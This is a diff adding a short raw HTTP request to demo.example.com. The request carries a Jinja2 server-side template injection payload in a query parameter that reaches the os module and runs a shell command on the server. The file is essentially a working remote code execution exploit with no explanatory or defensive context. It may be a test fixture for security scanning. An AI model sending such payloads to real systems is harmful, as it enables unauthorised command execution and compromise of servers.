@@ -1,0 +1,4 @@
+GET /a?id={{lipsum.__globals__[\u0027os\u0027].popen(\u0027id\u0027).read()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
